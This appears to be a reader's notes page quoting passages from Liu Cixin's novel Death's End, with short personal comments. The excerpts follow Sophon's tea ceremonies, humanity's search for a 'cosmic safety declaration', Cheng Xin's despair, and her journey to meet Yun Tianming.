<p>“这不是正规的星际战争，只是顺手消除可能的威胁。所谓随意的，是说坐标被发布是唯一的打击依据，不会对目标进行近距离直接探测，只是发动打击，因为对超级文明来说，近距离探测比打击成本更高；所谓经济的，是指只进行最低成本的打击，用微小低廉的发射物诱发目标星系中的毁灭能量。”“诱发恒星的能量吗？”</p>
<p>智子点点头，“到目前为止，我们看到的是这样。”“有可能防御吗？”智子微笑着摇摇头，像对一个孩子解释她的幼稚，“整个宇宙在暗处，我们在明处。我们在黑暗森林中就是一只拴在树顶上的小鸟，被聚光灯照亮，打击可能来自任何方向。”</p>
<p>“从两次打击的性质来看，应该是有被动防御的可能，三体世界在本星系也有飞船幸存。”“请相信我，人类绝对无法在打击中幸存。逃亡吧。”</p>
<p>“星际逃亡，我们能逃离的人连千分之一都不到。”“那总比全军覆没强。”</p>
<p>从我们的价值观来说，未必。程心暗想，但没有说出口。“我们不要再谈这些，好吗？请不要再提问题，我能告诉你们的就是上面那些了，我是请两位朋友来喝茶的。”智子说，对两人鞠躬后，把两碗碧绿的茶分别递给他们。</p>
<p>2016-01-28</p>
<p>到目前为止一言不发的罗辑仍很从容，而他对茶道显然更内行些，左手托着茶碗，右手把碗转了三圈才开始喝。他喝得很慢，让时间在寂静中流逝。直到窗外的云雾染上了夕阳的金色，他的茶才喝完，然后他慢慢放下碗，说出了第一句话：</p>
<p>“我也不能再问了吗？”罗辑在三体世界的威望早就在智子身上得到了显现。从一开始程心就注意到，与对自己表现出来的温和友善不同，智子对罗辑充满了敬畏，只要她面对罗辑，这敬畏就会从目光中毫不掩饰地流露出来。她总是同罗辑保持着比程心更远的距离，对罗辑鞠躬时也更慢更深一些。听到罗辑的话，智子又深深鞠躬。“请等一下。”她说，然后垂眼静坐，像在沉思。程心知道，几光年外的太空里，三体舰队的飞船上，智子的控制者们正在紧张地商议。大约两分钟后，她抬起头来说：</p>
<p>“您只能提出一个问题，我只能做肯定、否定或不知道三种回答。”罗辑把茶碗慢慢放下，但智子又抬起手阻止他说话：“这是出于我的世界对您的尊敬。我说出的答案肯定是真实的，即使这个答案可能对三体世界有害，但只能有一个问题，我也只能做三种简单的回答，请您在提问前慎重考虑。”程心担忧地看着罗辑，后者却几乎没有停顿，果断地说：“我考虑好了，下面是我的问题：如果从宇宙尺度的远距离观察，三体世界显现出某种危险特征，那么，是否存在某种安全特征，或者叫安全声明，可以向宇宙表明一个文明是安全的，不会对其他世界构成任何威胁，进而避免黑暗森林打击？地球文明有办法向宇宙发出这样的安全声明吗？”</p>
<p>对这个问题，智子迟迟不回答，又垂下双眼沉思。在程心的感觉中这段时间长得惊人，每过一秒，她的信心就减退一分，最后她几乎肯定智子的回答是没有或不知道。但智子突然用明澈的双眼直视罗辑——在此之前，她从来没有敢于正视过他——她回答了一个字，语气斩钉截铁：“有。”</p>
<p>2016-01-28</p>
<p>茶道谈话”给在等待中乞讨希望的人们伸出的无数双手里放上了一点儿东西：有可能向宇宙发布避免黑暗森林打击的安全声明。</p>
<p>2016-01-28</p>
<p>宇宙安全声明——孤独的行为艺术</p>
<p>2016-01-28</p>
<p>人们很快发现，安全声明是一个越想越深的谜。</p>
<p>所有的发布方案大致可分为两大类：声明派和自残派。声明派的设想很简单，就是向宇宙广播声明，宣布地球文明是安全的。这一派主要致力于研究声明的表达方式。不过在大多数人看来，这个想法近乎弱智，不管表达方式多么精妙，在这个冷酷的宇宙中，真会有“人”相信吗？况且，安全声明需要的是宇宙中的无数文明全部相信。</p>
<p>自残派占主流，他们的理论认为，安全声明的内容必须是真实的，这就意味着声明包括“说”与“做”两部分，而“做”是重点，人类必须为在黑暗森林中的生存付出代价，把地球文明变成确实安全的文明，直白说就是文明的自残。大多数的自残方案都着眼于技术，主张人类主动退出太空时代和信息时代，建立一个低技术社会，比如19世纪末的电气和内燃机社会，甚至农耕社会。考虑到世界人口的急剧下降，这个方案是可行的。这样，安全声明就变成了低技术声明。</p>
<p>自残派中还出现了极端想法：智力自残。使用某种药物或脑科学技术降低人类的智力，并在基因水平把这种低智力在遗传上固定下来，低技术社会自然就实现了。这种想法其实是走向极端的技术自残，让大多数人厌恶，但仍广为流行。按照这种设想，安全声明就是弱智声明。还有许多其他思潮，比如自我威慑派，主张建立某种自我威慑系统，一旦启动即脱离人类的控制，系统如果监测到人类的不安全行为，则启动毁灭机制。</p>
<p>这是一场想象力的盛宴，无数的方案中，有的精巧，有的奇特，也有的像邪教般恐怖和邪恶。但所有这些方案都没抓住安全声明的实质。</p>
<p>智子指出，黑暗森林打击的一个重要特点就是随意性，打击的发起者不对目标进行近距离探测。在已经提出的所有方案中，人类只是在表演着没有观众的行为艺术，不管做得多么诚心，除自己外没人能看到。退一万步说，即使真有某些慈父般的文明对地球进行近距离探测，甚至在地球和太阳系中安装类似于智子的长期监视系统，它们也只占宇宙中亿万文明的极小一部分。在大多数宇宙文明的眼中，太阳只是无数光年外一个暗弱的光点，没有任何细节特征，这是宇宙黑暗森林状态的基本数学结构。</p>
<p>2016-01-28</p>
<p>曾经有过一个天真的时代，那时科学家相信，能够通过远距离观测发现遥远恒星系中存在的文明迹象，比如探测行星大气中氧气、二氧化碳和水的吸收光谱，以及文明发出的电磁辐射等，甚至提出戴森球迹象这类异想天开的猜测。现在知道，这是一个所有文明都在隐藏自己的宇宙，如果一个恒星系从远方观察没有任何智慧迹象，可能是因为它真的处于蛮荒状态，也可能是那个星系中的文明已经成熟的标志。</p>
<p>2016-01-28</p>
<p>安全声明实质上是一种宇宙广播，并且需要所有的聆听者都相信它的内容。</p>
<p>有一颗遥远的星星，是夜空中一个隐约可见的光点，所有随便望了它一眼的人都说，那颗星星是安全的。这就是宇宙安全声明。</p>
<p>2016-01-28</p>
<p>还有一个让人百思不得其解的谜：为什么智子不告诉人类如何发布安全声明？幸存的三体文明对人类进行技术封锁是完全可以理解的。宇宙广播以后，两个世界都面临着来自整个银河系甚至全宇宙的敌意，相互间都不再是对方的重大威胁，也无暇顾及彼此。随着三体舰队在茫茫太空中渐行渐远，两个文明间的联系也渐渐变得细若游丝。但有一个事实是三体和地球人都永远不会忘记的：目前所有这一切的根源都在于三体世界，是他们首先对太阳系发起入侵，是他们试图灭绝人类并几乎成功。如果地球人类在技术上取得飞跃，复仇是不可避免的，最有可能的复仇对象就是幸存的三体人可能找到的新家园，而这种复仇可能在地球文明被黑暗森林打击摧毁之前就完成。</p>
<p>但安全声明不同，如果这种声明能够使全宇宙都相信地球是安全的，那地球对三体文明也是安全的，这难道不正是三体世界希望看到的？</p>
<p>2016-01-28</p>
<p>对安全声明的变态理解还引发了一些恶性恐怖事件，出现了一些主张降低人类智力的“反智慧”组织，其中的一个组织策划了一次大规模行动，在纽约的城市自来水系统中大量加入一种名为“神经元阻遏剂”的药物，该药物能够对大脑产生永久性伤害。好在发现及时，没有造成太大伤害，只是使纽约的供水系统瘫痪了几个小时。令人不解的是，这些“反智慧”组织却无一例外地要求自己保持高智慧，严禁组织成员示范性地使用降低智力的药物或其他技术手段，声称自己有责任做最后一批“智慧人”，以完成低智慧社会的建立并领导其运行。</p>
<p>2016-01-28</p>
<p>在死亡的威胁与生存的诱惑面前，宗教再一次成为社会生活的中心。</p>
<p>2016-01-28</p>
<p>但在大移民灾难中，宗教开始了全面的复兴。现在，有一种思潮广为流行，认为人类在过去的七十多年中两次濒临毁灭的边缘，两次都奇迹般地脱险。这两次脱险事件——黑暗森林威慑的建立和引力波宇宙广播的启动，有许多共同的特点：它们都是在极少数人的策划下突然发生的，它们的发生依赖于许多平时看似不可能出现的机遇，比如两艘飞船和水滴同时进入四维碎块等；这都是明显的神迹。在两次危机到来时，信徒们都进行了虔诚的大规模祈祷，正是这样虔诚的祈祷最终迎来主的拯救，尽管对于究竟是来自哪个主存在着不可调和的争论。</p>
<table>
<thead>
<tr>
<th>注</th>
<th>愚昧</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
</tr>
</tbody>
</table>
<p>2016-01-28</p>
<p>甚至三体文明也成为祈祷的对象。历史上，三体文明在人类眼中的形象一直不断变化。危机纪元之初，他们是强大而邪恶的外星入侵者，同时也在地球三体运动中被ETO神化；之后，三体世界的形象渐渐由魔鬼和神降为人，黑暗森林威慑建立以后，三体世界在人类眼中的地位降到最低，他们成了一群文化低劣、仰人类鼻息的野蛮人；威慑中止后，三体人又露出了入侵者和人类灭绝者的真面目；但很快，宇宙广播启动后，特别是在三体星系毁灭后，他们又成了与人类同病相怜的受害者</p>
<table>
<thead>
<tr>
<th>注</th>
<th>轻仇必定寡恩</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
</tr>
</tbody>
</table>
<p>2016-01-28</p>
<p>在得知安全声明这回事后，人类社会最初的反应是一致的，强烈要求智子公布发布声明的方法，警告她不要为此犯下世界毁灭罪行。但很快人们意识到，对于一个正在星际中远去、同时仍然掌握着人类无法企及的高技术的世界，任何狂怒和谴责都是无济于事的，最好的办法还是请求。请求后来变成乞求，渐渐地，在苦苦的乞求中，也在日益浓厚的宗教氛围中，三体世界的形象再次发生了变化。既然他们掌握着发布安全声明的方法，那他们就是上帝派来的拯救天使了，人类之所以还没得到他们的救赎，是因为还没有充分表现出自己的虔诚。于是对智子的乞求又变成祈祷，三体人再一次变成了神。智子的居住地成了圣地，每天都有大批的人聚集在那棵巨树建筑下，人数最多的时候是往年麦加朝圣人数的数倍，形成一片一望无际的人海。那幢空中别墅在四百多米高处，从地面看上去很小，在它自身产生的云雾中时隐时现。有时智子的身影会在别墅前出现，看不清细节，只有她的和服像一朵云中的小花。这种情况很少发生，因而也很神圣，人海中信仰各种宗教的人都以自己的方式表达虔诚。有的加紧祈祷，有的欢呼，有的声泪俱下地倾诉，有的跪拜，有的五体投地。每到这时，智子只是向下面的人海微微鞠躬，然后悄然退去。</p>
<p>2016-01-28</p>
<p>“即使拯救真的出现还有意义吗？人类的尊严已丧失殆尽。”毕云峰说，他曾是执剑人的候选人之一，大移民时成为地球抵抗运动亚洲分支的主要指挥官。</p>
<p>2016-01-28</p>
<p>对于已消失在太空中的“蓝色空间”号飞船，人类社会的孩子脸又变了。这艘飞船由拯救天使再次变成黑暗之船、魔鬼之船。它劫持了“万有引力”号，对两个世界发出了罪恶的毁灭诅咒，它的罪恶不可饶恕，它是撒旦的终极形态。那些朝拜智子的人，同时也代表人类发出请愿，希望三体舰队尽快搜索并追杀两艘飞船，以维护正义和主的尊严。与其他的祈祷一样，这个呼吁没有得到智子的任何回应。</p>
<p>2016-01-28</p>
<p>与此同时，程心在公众眼中的形象也慢慢发生着变化，她不再是一个不合格的执剑人，再次成为一位伟大的女性。人们挖出了一篇古老的散文——屠格涅夫的《门槛》来形容她，她勇敢地跨过了那道没有女人敢于接近的门槛，然后，承受着常人难以想象的巨大压力，也面对着日后将遭受的无尽的屈辱，在最后关头没有向宇宙发出毁灭的信号。至于她最后放弃威慑操作带来的后果，人们不再多想，只是感受着她对人类的爱，这种爱产生的痛苦甚至使她双目失明。</p>
<p>从深层分析，公众对程心的这种感情其实是对她潜意识中的母爱的回应。在这个家庭已经消失的时代，母爱也变得稀薄，天堂般的高福利社会抑制了孩子们对母爱的需求。但现在，人类世界暴露在冷酷的宇宙中，死神的镰刀随时都会落下，人类这个文明的婴儿被丢弃在阴森恐怖的黑暗森林中，他大哭起来，只想抓住妈妈的手。而程心这时正好成了寄托母爱的对象，这个来自公元世纪的年轻美丽的女性是先祖派来的爱的使者，是母爱的化身。当公众对程心的感情纳入了日益浓厚的宗教氛围中时，一个新纪元圣母的形象再次被逐渐建立起来。对程心来说，这断绝了她活下去的最后希望。</p>
<p>2016-01-28</p>
<p>生活对于程心早就成了负担和折磨。她之所以选择活着，是不想逃避自己应该承担的东西，活下去就是对自己那巨大失误的最公平的惩罚，她必须接受。但现在，她已经成了一个危险的文化符号，对她日益增长的崇拜，将成为已经在迷途中的人们眼前的又一团迷雾，这时，永远消失就是她最后应尽的责任了。</p>
<p>程心发现，自己做出这个决定竟然很轻松，就像一个早就打算远行的人，终于卸下一切俗务，可以轻装出发了。程心拿出一个小药瓶，里面只剩一粒胶囊，这是短期冬眠的药物，她就是靠这种药冬眠了六年，但如果没有体外循环系统维持生命，人服用后会很快无痛苦地死去。</p>
<p>这时，程心的意识就像太空一般透明而空旷，没有回忆，没有明显的感觉，精神的水面平滑如镜，倒映着正在落下的生命的太阳，像每一个黄昏一样自然……这就对了，如果一个世界都能在弹指一挥间灰飞烟灭，一个人的终结也就应该如露珠滚下草叶般平静淡然。</p>
<p>2016-01-28</p>
<p>正当程心把胶囊放在手中时，电话响了，又是弗雷斯打来的，这里是黄昏，澳大利亚已是夜里。</p>
<p>“孩子，这里月亮很好，我刚才看到一只袋鼠，移民居然没把它们吃光。”弗雷斯从来不用视频通话，好像自信他的语言比图像更生动，虽然知道他看不到自己，程心还是笑了笑说，“那真好，弗雷斯，谢谢你。”</p>
<p>“孩子，一切都会变得好起来的。”老人说完就挂断了电话，他应该没发现什么异常，他们每次通话都这么简短。</p>
<table>
<thead>
<tr>
<th>注</th>
<th>有人在保护程心  云天明</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
</tr>
</tbody>
</table>
<p>2016-01-28</p>
<p>程心突然意识到自己还有两个朋友，在这一段噩梦般的短暂历史中，她只有这两个真正的朋友，如果她结束自己的生命，那对他们是怎样的打击？她刚才还透明空灵的心突然抽紧了绞痛起来，像被许多只手抓住。平静的精神水面破碎了，上面倒映的阳光像火一般燃烧起来。七年前，在全人类面前她没能按下那个红色按钮，现在想到两个朋友，她也难以吞下这粒会带来解脱的药。她再一次看到了自己无边无际的软弱，她什么都不是，只是一个女人</p>
<p>2016-01-28</p>
<p>刚才，她面前的那条河是封冻的，她可以轻松地走到彼岸；但现在，河面融化了，她只能蹚过黑色的河水。这将是漫长的折磨，但她相信自己会走到对岸的，也许会犹豫和挣扎到明天凌晨，但她最终会咽下那粒胶囊，她已经别无选择。</p>
<p>这时电话又响了，是智子打来的，她又请程心和罗辑明天去喝茶，说这是同他们最后的告别。</p>
<p>2016-01-28</p>
<p>在别墅的门前，智子又说了与前两次一样的欢迎的话。</p>
<p>这次的茶道是在沉默中进行的，他们都明白，两个世界间该说的话已经说完了。程心和罗辑都清楚地感觉到下方人海的存在。地面上沉默的人海像一块大吸音毯，使茶厅中的寂静更深了，有一种压抑感，似乎窗外的白云都凝重了许多，但智子的动作仍那么轻柔曼妙，细瓷茶具相碰都不发出一点声音，智子似乎在用轻柔和飘逸对抗这凝重的时空。一个多小时过去了，程心和罗辑并没有感觉到漫长。</p>
<p>智子把做好的茶双手捧给罗辑，说：“我要走了，请二位多多保重。”再把茶捧给程心，“宇宙很大，生活更大，也许以后我们还有缘相见。”寂静中，程心抿了一小口绿茶，闭起双眼品味着，一阵沁人心脾的清苦，像饮下了冷寂的星光。茶喝得很慢，但最后还是喝完了。程心和罗辑起身作最后的告辞，这次智子送了他们很远，一直沿着旋梯送到树枝上。这时，别墅喷出的白云第一次消失了，在下方的地面上，人海仍沉默着。</p>
<p>“在分别前，我要完成最后一项使命，传递一个信息。”智子说着，向两人深深鞠躬，然后起身抬头，用意味深长的目光看着程心。“程心，云天明要见你。”</p>
<p>广播纪元7年，云天明</p>
<p>2016-01-28</p>
<p>危机纪元之初，人类社会的热情还没有被大低谷扑灭，为建立太阳系防御，曾经集中地球世界的资源完成了一系列的壮举。这些巨大的工程都达到或突破了当时技术的极限，像太空电梯、恒星型核弹在水星的试验、可控核聚变技术的突破等等，都已载入史册。这些工程为大低谷后的技术飞跃奠定了基础。但阶梯计划不属于此列，甚至在大低谷之前它就被遗忘了。在历史学家看来，阶梯计划是典型的危机初期激情和冲动的产物，是一次没有经过周密计划就草率进行的冒险。除了结局的完全失败，在技术上也没留下什么有价值的东西，后来的宇航技术完全是朝着另一个方向发展的。</p>
<p>谁也没有想到，在近三个世纪后，阶梯计划为绝境中的地球文明带来了一线曙光。运载着云天明大脑的阶梯飞行器是如何被三体世界截获的，可能永远是个谜。</p>
<p>2016-01-28</p>
<p>截获阶梯飞行器的基本可以确定是三体第一舰队的飞船，最有可能是那艘一直没有减速的飞船。当时它大大前出于舰队，预计提前一个半世纪到达太阳系，到达后因速度太高只能穿越而过；这艘飞船的目的也一直是个谜。黑暗森林威慑建立后，这艘飞船与第一舰队一起转向，对于它的航线参数地球方面并没有掌握，但如果它转向后的航线与第一舰队方向一致的话，就可能与偏航后的阶梯飞行器相遇。当然，即使相遇，两者间交错时也有巨大的距离，如果那艘飞船没有掌握飞行器的精确轨道参数，也不可能对它进行搜索定位。</p>
<p>对于飞行器被截获的具体时间只能粗略估算，在三十到五十年前，不可能早于威慑纪元。</p>
<p>2016-01-28</p>
<p>三体舰队截获阶梯飞行器的动机是可以理解的。直到最后，三体世界与人类世界真正的实体接触也仅限于水滴，所以得到一个人类的实体生物标本对他们还是有一定诱惑力的。</p>
<p>云天明现在肯定身处三体第一舰队，该舰队的大部分飞船朝天狼星方向飞行。他的状态不得而知，不知道他的大脑是被单独培养，还是移植到克隆出的身体中，但人们最关心的还是另一个问题。云天明仍在为人类的利益而工作吗？</p>
<p>这个担心不无道理，云天明见程心的要求得到应允，说明他已经融入了三体世界，甚至可能在那个世界已经拥有了一定的社会地位。接下来一个顺理成章但令人震惊的问题是：他是否参与了威慑纪元开始后至今的历史，这半个世纪中两个世界间发生的一切与他有没有关系？</p>
<p>但云天明毕竟是在地球文明陷入绝境的关键时刻出现的，他真的带来了希望。人们得知这一消息时，第一个反应就是，自己的祈祷得到了回应，拯救天使终于出现了。</p>
<p>2016-01-28</p>
<p>作为一名公元世纪的航天工程师，程心在近三个世纪后的今天才第一次进入太空。现在乘坐任何航天飞行器都不再需要适应性训练，但考虑到她可能的不适，技术支持小组还是让她搭乘太空电梯。运载舱几乎全程都是匀速直线运行，没有超重，舱中的重力也没有明显的落差。重力是逐渐减小的，直到同步轨道的终端站才会出现完全的失重。有时，程心看到一个小点从远处飞速掠过，那可能是以第一宇宙速度运行的卫星，在这个高度，只有以它们那样的速度沿轨道方向运行才能产生失重。</p>
<p>2016-01-28</p>
<p>程心想起在大学时的一次什么讨论中，云天明曾说，从原理上讲低速航天是完全可能的，只要能维持恒定上升的动力，以汽车的速度，甚至以步行的速度也可以走到太空，甚至可以走到月球轨道，但不可能登上月球，因为那时月球与走过去的人有着每小时三千多千米的相对速度，如果试图消除这种速度与月球保持静止，那就又成高速航天了。程心还清楚地记得他最后说：在月球轨道附近，看着庞大的月亮从头顶飞速掠过，肯定很震撼。现在她就是在他说过的低速航天中。</p>
<p>2016-01-28</p>
<p>那是一个短暂的专制时代，全世界都处于军事状态，然后是崩溃，从信仰到生活，一切都崩溃了……可为什么把这些画保留到现在，为了记忆还是忘却？</p>
<p>2016-01-28</p>
<p>在这个过程中，程心感觉自己是在“井”中穿过时代的地层。在两个多世纪中，终端站是由内向外一环一环扩建的，所以越深处地层越新。每一环的建造材料都与上一环不同，看上去也都比上一环新许多，其建造和装饰风格彰显出一个时代的断面。从大低谷压抑冷漠整齐划一的军事色彩，到危机纪元后半叶的乐观和浪漫，再到威慑纪元弥漫着自由和懒散的享乐主义。</p>
<p>2016-01-28</p>
<p>但尘世都市的景象很快消失了，一辆小机动车把他们送到一处能直接看到太空的地方。这是入口处标有“A225港”的一个扁平大厅，像广场一般宽阔的平面上停放着几十艘形状各异的小型太空飞行器，大厅的一侧则完全向太空敞开，可以看到随着终端站的旋转而移动的群星。不远处一团强光亮起，照亮了整个港口，那个光团由橘黄色渐渐变成纯蓝，那艘刚启动发动机的太空艇缓缓移出，很快加速，直接从港口的敞开处冲进太空。程心看到了一个人们已经习以为常的技术奇迹，她一直不明白如何在不完全封闭的太空建筑中保持空气和气压。</p>
<p>2016-01-28</p>
<p>三天前，智子与程心和罗辑分别后，就向地球方面详细通报了会面的细节。她首先阐明了这次会面的基本原则：这只是云天明和程心两人之间的事，与任何第三方无关。会面中，他们谈话的内容也将严格限制在两人之间，不得涉及任何三体世界的技术、政治和军事方面的内容，云天明不能谈这些内容，程心也不能提这样的问题。会面过程中不得有第三方在场，也不能进行任何形式的记录。</p>
<p>会面地点在地球与太阳之间拉格朗日点的太空中，距地球一百五十万千米，通过由智子建立起的与三体第一舰队的实时通信进行，可以进行实时谈话和图像传送。为什么要在百万千米之外的太空中进行会面通信？在中微子通信时代，这个距离的太空隔绝性与在地面上没有太大区别。按智子的解释，这只是一种象征，让会面在孤立的环境中进行，以表示其与两个世界无关。之所以选择拉格朗日点，只是为了保持会面时位置的稳定，同时，按三体世界在太空中的惯例，天体间的引力平衡点就是约会的地方</p>
<p>2016-01-28</p>
<p>现代的太空飞行器内部已经没有直接手动的操纵物，操纵显示屏都是在空中投影，所以舱内空荡荡的。如果一个公元人第一次进入这里，可能会以为这是一个没有任何设备的空壳。但程心立刻看到了三个不寻常的东西，显然是后来装上的。那是三个圆片，贴在前面半球形的舷窗上方，分别是绿、黄、红三种颜色，让人想起过去的交通信号。参谋长向程心解释它们的用途：</p>
<p>“这是三盏灯，由智子控制。会面通信过程自始至终都被监听和监视，如果他们认为谈话内容正常，绿灯亮；如果相对不适宜的内容发出警告，黄灯亮。”总参谋长说到这里突然沉默了，过了好一段时间，似乎下定了决心，他才向程心解释红灯的作用：</p>
<p>“如果他们认为你已经知道了不该知道的信息，红灯亮。”他转过身，指了指他们背后不透明的那部分舱壁，程心看到那里贴着一个不引人注意的小金属体，像是一个古代天平用的砝码。“这是一个爆炸物，也由智子控制，红灯亮后三秒钟引爆，摧毁一切。”</p>
<p>“哪一方的一切？”程心问，她首先想到的不是自己。“只是地球这一方。不用为云天明的安全担心，智子已经明确告诉地球方面，即使红灯亮起，被毁灭的只是太空艇，云天明不会受到任何伤害。</p>
<p>“红灯可能在谈话过程中亮起。如果整个会面过程正常完成，但他们在重新审查所监听的谈话内容时发现有不适宜内容，那时红灯也可能亮。下面，我要告诉你最重要的一点……”参谋长又沉默了，程心的目光平静如水，对他微微点头，鼓励他继续。</p>
<p>“千万注意，绿、黄、红三灯不是顺序亮起，红灯亮之前不一定有警告，可能由绿灯直接跳到红灯。”“好的，我知道了。”程心说，她的声音很轻，如一阵微风吹过。</p>
<p>“除了谈话内容，还有一种因素可能亮红灯：智子发现太空艇中有记录设备，或者有信息转发设备。但这个请你放心，绝对不会发生，太空艇是反复检查过的，没有任何记录设备，通信设备也全部拆除，连航行的日志功能都消除了，全部航行都是由艇内的A.I.自主进行，在返回前不会与外界进行任何形式的通信。程博士，你明白这意味着什么吗？”“如果我回不来，你们就什么也得不到了。”</p>
<p>“你能明白这点我很高兴，这正是我们要向你强调的。照他们说的去做，只谈你们之间的事，不要涉及其他，连隐喻和暗示都不要。时刻牢记一点：如果你回不来，地球什么都得不到。”“那样的话，如果我回来了，地球还是什么也得不到。将军，我不想让这事发生。”</p>
<p>总参谋长想看看程心，但没有直视她，只看着她在前面透明罩上的投影。她的影像叠印在星海上，那双美丽的双眸平静地映着星光，他突然感觉群星都在围着她旋转，她成了宇宙的中心。他再次强迫自己，没有进一步劝她不要冒险，而是说出了下面的话：“这个，”参谋长指指后面，“是一枚微型氢弹，按你们那时的TNT当量计算，五千吨级，可以炸毁一座小城市。如果真发生了，一切都在一瞬间，没有任何痛苦。”</p>
<p>程心又对参谋长恬淡地微笑了一下，“谢谢，我知道了。”</p>
<p>2016-01-28</p>
<p>五个小时后，程心乘坐的太空艇从港口起航了，3G的过载把程心紧紧压在椅背上，这是普通人能够舒适承受的超重的上限。从一个后视窗口中，她看到终端站巨大的外壳上反射着太空艇发动机的光亮，小艇像是从一只巨炉中飘出的一颗小火星。不过终端站本身也在迅速缩小，这个刚才程心还置身其中的巨大构造很快也变成一粒小点，但地球仍宏大地占据着半个太空。</p>
<p>2016-01-28</p>
<p>特别小组的人反复向程心强调，这次飞行本身而言是再普通不过了，不会比她以前乘坐一次民航飞机更特别。从终端站前往地日间的拉格朗日点将飞行约一百五十万千米，也就是百分之一个天文单位，是一次短程太空飞行，她乘坐的这艘球形艇也是一架短程太空飞行器。但程心记得，三个世纪前使她选择航天专业的一个重要诱因，是公元世纪中叶的一项伟大壮举，在那项壮举中，先后有十二个男人登上了月球，但他们的航程只是这段距离的五分之一。</p>
<p>2016-01-28</p>
<p>十多分钟后，程心目睹了一次太空中的日出。太阳从地球的弧形边缘上缓缓升起，太平洋的波涛已被距离抹去，像镜面一般光洁地反射着阳光，大片的云层像贴在镜面上的雪白肥皂沫。从这个位置上看，太阳比地球小许多，像是这个暗蓝色的世界孕育出的一枚光芒四射的金蛋。当太阳完全升出弧形地平线时，地球向阳的一侧被照亮成一个巨大的下弦月形状。这个大月牙是如此明亮，以至于地球的其余部分都隐没于阴影中，太阳与下面的弯月似乎构成了一个宇宙中的巨型符号，程心觉得它象征着新生。</p>
<p>2016-01-28</p>
<p>程心知道，这很可能是她见到的最后一次日出了。在即将到来的会面中，即使双方都忠实地遵守谈话的规则，那个遥远的世界可能也不会让她活着返回，而她不打算遵守规则。但她感觉一切都很完美，没有什么遗憾了。</p>
<p>2016-01-28</p>
<p>随着太空艇的行进，地球被照亮的一面在视野中渐渐扩大。程心看着大陆的轮廓，很轻易地认出了澳大利亚，它像漂在太平洋中部的一大片枯叶。那块大陆正在从阴影中移出，明暗交界线位于大陆中部，表明沃伯顿刚好是早晨，她想象着弗雷斯在树林边看到的沙漠日出的景象</p>
<table>
<thead>
<tr>
<th>注</th>
<th>好美  平静的走向自己的归宿，而淡淡的祝福着自己的朋友</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
</tr>
</tbody>
</table>
<p>2016-01-28</p>
<p>五个小时后，太空艇旋转一百八十度，发动机对准前进方向开始减速。太空艇转向时，程心看到太阳缓缓移走，然后，群星和银河像一轴展开的长卷般从视野中流过。最后当太空艇再次稳定下来时，地球又出现在视野正中，这时它看上去只有地面上看到的月球大小。几个小时前它在程心眼前展示的宏大已经消失得无影无踪，只剩下脆弱，像一个充满蔚蓝色羊水的胚胎，被从温暖的母腹中拿出，暴露在太空的寒冷和黑暗中。</p>
<p>2016-01-28</p>
<p>这里就是地日间的拉格朗日点，这时，太空艇已成为一颗太阳的卫星，与地球同步运行。</p>
<p>程心看了一下表，航行时间卡得很准，现在离会面还有十分钟。周围的太空仍一片空旷，她努力使自己的意识也空旷起来。她要为大量的记忆做准备，能够记录会面信息的只有她的大脑，她要使自己变成一架没有感情的录音机和摄像机，在以后的两个小时中尽可能多地记下听到和看到的一切。做到这点不容易，程心想象着她身处的这片空间，这里太阳和地球的引力相互抵消为零，这里比别处的太空又多了一分空旷，她置身于这片零的空旷中，是一个孤立的存在，与宇宙的任何部位都没有关系……她用这种想象一点一点地把纷繁的感情赶出意识，渐渐达到了她想要的空白的超然状态。</p>
<p>2016-01-28</p>
<p>程心曾无数次猜测自己将看到什么，也许只有声音或文字，也许会看到一个培养液中的大脑，也许会看到云天明完整的本人……虽然她认为最后的那个可能性很小，但还是设想了那种情况下云天明可能身处的环境，也想出了无数种，然而，现在见到的绝对超出了她的想象。</p>
<p>一片阳光下的金色麦田。麦田大约有半亩的样子，长势很好，该收割了。田地的土壤有些诡异，是纯黑色的，颗粒的晶面反射着阳光，在土地上形成无数闪烁的星星。在麦田旁的黑土中，插着一把铁锹，式样很普通，甚至它的锹把看上去都像是木头的。铁锹上挂着一顶草帽，显然是用麦秸秆编成的，有些旧了，磨破的边缘上秸秆都伸了出来。在麦田的后面还有一片地，种着绿色的作物，好像是蔬菜。一阵微风吹过，麦田里泛起道道麦浪。</p>
<p>在这黑土田园之上，程心看到了一个异世界的天空，或者穹顶。那是由一大团纷乱的管道构成的，管道有粗有细，都呈暗灰色，像一团乱麻般缠绕纠结。在这缠盘成一堆的上千根管道中，有两三根在发光，光度很强，像几根蜿蜒曲折的灯丝。发光的管道露在外面的部分把光芒洒向麦田，成为供作物生长的阳光，同时也用光亮标示出它在那团管道乱麻中的走向。每根发光的管道只亮很短的时间就暗下去了，同时另一根管道又亮起来，每时每刻都保持有两至三根管道发光，这种转换使得麦田上的光影也在不断变幻中，像是太阳在云层中出没一样。令程心感到震撼的是这团管道的混乱程度。这绝不是疏于整理造成的，相反，形成这种混乱是要费很大力气的，这是一种达到极致的混乱，好像其中出现任何一点点的秩序都是忌讳。这似乎暗示着一种与人类完全不同的美学取向：混乱是美的，秩序是丑的。那些发光的管道使这团乱麻有了奇特的生气，有种阳光透过云层的感觉，程心一时不禁想到，这是不是对云和太阳的一种极度变形的艺术表现？旋即，她又感觉整团管道乱麻像一个巨大的大脑模型，那交替亮起的管子象征着一条条神经回路的建立……但理智使她否定了这些奇想，比较合理的推测是：这可能是一个散热系统或类似的装置，并非为下面的农田而建，后者只是利用它发出的光照而已。仅从外形上看，这个系统所表现出来的工程理念是人类完全无法理解的，程心既感到疑惑，又被它迷住了。</p>
<p>2016-01-28</p>
<p>“程心，你好！”云天明说。他看她的目光中充满喜悦，但那是一种很自然的喜悦，就像田间干活的小伙子看到同村的姑娘从城里回来时一样，仿佛三个世纪的岁月不存在，几光年的距离也不存在，他们一直在一起。这是程心完全没有想到的，云天明的目光像一双宽厚的手抚摸着她，让她极度紧张的精神放松了一些。</p>
<p>这时，贴在舷窗上的三盏灯中的绿灯亮了。“你好！”程心说，跨越三个世纪的情感在她的意识深处涌动，像郁积的火山。但她果断地封死了情感的一切出口，只是对自己默念：记，只是记，记住一切。“你能看到我吗？”</p>
<p>“能看到。”云天明微笑着点点头，又向嘴里扔了一粒麦子。“你在做什么？”</p>
<p>对这个问题，云天明似乎感到有些不可思议，他向麦田挥挥手，“种地呀！”“是在为自己种吗？”</p>
<p>“当然，要不我吃什么？”</p>
<p>2016-01-28</p>
